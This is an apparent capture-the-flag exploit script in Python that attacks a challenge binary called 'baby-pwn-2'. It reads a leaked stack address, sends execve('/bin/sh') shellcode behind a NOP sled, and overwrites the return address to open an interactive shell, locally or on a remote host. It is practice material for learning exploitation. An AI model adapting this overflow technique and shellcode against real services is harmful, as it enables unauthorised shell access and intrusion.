#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
from six import b

exe = ptr.ELF("./baby-pwn-2")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.162.119.16", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def sla(delim: bytes, data: bytes):
        io.sendlineafter(delim, data)
        return

    def sa(delim: bytes, data: bytes):
        io.sendafter(delim, data)
        return

    def sl(data: bytes):
        io.sendline(data)
        return

    def s(data: bytes):
        io.send(data)
        return

    def ru(delim: bytes, drop: bool = False) -> bytes:
        return io.recvuntil(delim, drop=drop)

    def rl() -> bytes:
        return io.recvline()

    exe.base = 0x0000000000400000

    ru(b"leak: ")
    stack_addr = int(rl().strip(b"\n"), 16)

    ptr.logger.info(f"stack_addr: {hex(stack_addr)}")

    shellcode = [
        0x48,
        0xB8,
        0x2F,
        0x62,
        0x69,
        0x6E,
        0x2F,
        0x73,
        0x68,
        0x00,
        0x50,
        0x54,
        0x5F,
        0x31,
        0xC0,
        0x50,
        0xB0,
        0x3B,
        0x54,
        0x5A,
        0x54,
        0x5E,
        0x0F,
        0x05,
    ]
    payload = b""
    payload += b"\x90" * 0x10
    payload += bytes(shellcode)
    payload = payload.ljust(0x48, b"\x90")
    payload += ptr.p64(stack_addr)
    sl(payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
